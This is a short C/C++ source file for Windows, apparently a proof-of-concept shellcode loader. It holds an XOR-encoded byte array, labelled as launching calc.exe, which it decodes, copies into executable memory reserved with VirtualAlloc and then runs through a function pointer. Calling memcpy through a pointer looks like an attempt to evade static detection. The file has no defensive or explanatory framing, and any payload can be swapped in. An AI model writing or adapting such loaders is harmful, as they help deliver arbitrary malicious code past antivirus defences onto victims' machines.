#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <sstream>
#include <vector>
#include <iomanip>
#pragma warning

unsigned char key = 0x23;

// run calc.exe
unsigned char payload[] =
"\x76\x6b\xaa\xc6\x6b\xa0\xcf\x63\x6b\x12\xe3\x6b\xaa\x66\xdb\x6b"
"\xaa\x66\xd3\x6b\xaa\x66\xcb\x6b\xaa\x66\xc3\x6b\xaa\x66\xfb\x6b"
"\xaa\x66\xf3\x6b\xaa\x66\xeb\x73\x6b\x9b\x74\x4a\x4d\x66\x5b\x46"
"\x40\x32\x6b\xe2\xc3\x2b\x6b\xe2\xcb\x2b\x73\x6b\xaa\x46\xfb\x6b"
"\x12\xe3\x93\x43\x46\x6b\xa8\x23\x6b\xa8\x63\x3b\x6b\xa8\x63\x03"
"\x6b\xa8\x23\x6b\xa8\x23\x6b\xa8\x63\x03\x6b\xaa\xe0\x6b\x12\xea"
"\xa8\x60\x1f\x6b\x22\xfb\x6b\x12\xea\xa3\xe2\xab\xa8\x27\x2b\x6b"
"\x22\xfb\xa8\x6b\x37\x6b\xaa\x6e\xdb\xa8\x6b\x3f\x6b\x22\xfa\x6b"
"\xaa\x6e\xd3\xa8\x6b\x03\x6b\x22\xfa\x6b\xaa\x6e\xcb\xa8\x6b\x07"
"\x6b\x22\xfa\x6b\xaa\x6e\xc3\x6b\x12\xe3\x6b\x12\xea\x6b\xa8\x56"
"\xfb\x6b\xa8\x5e\xcb\xdf\xa8\x1f\xa4\x6b\x22\xfc\x92\x2b\xd0\x85"
"\x57\x2a\x6b\xdc\xe3\x6b\x18\x66\xdb\x56\xc1\x6b\xa8\x6e\xc3\x6b"
"\xa8\x76\xd3\x45\xa8\x27\x62\xa8\x27\xa1\x6b\x22\xfb\xc8\x23\x6b"
"\x12\xf1\x6b\x12\xea\x72\x6b\x9a\x40\x42\x4f\x40\x0d\x46\x5b\x46"
"\x72\x6b\xaa\xc2\x91\x22\x6b\xa0\xc7\xd3\x6b\xa0\xcf\x03\xdc\xf3"
"\x6b\xa0\xe7\x1b\x6b\xa0\xe7\x3b\x6b\xa0\xe7\x2b\x7e\xe0";

//Decode XOR
void xorCrypt(unsigned char* data, size_t dataSize, unsigned char key) {
    for (size_t i = 0; i < dataSize; ++i) {
        data[i] ^= key;
    }
}

int main() {
    size_t dataSize = sizeof(payload);
    void* (*memcpyPtr) (void*, const void*, size_t);
    void* exec = VirtualAlloc(0, dataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    xorCrypt(payload, dataSize, key);
    memcpyPtr = &memcpy;

	memcpyPtr(exec, payload, dataSize);
	((void(*)())exec)();
    return 0;
}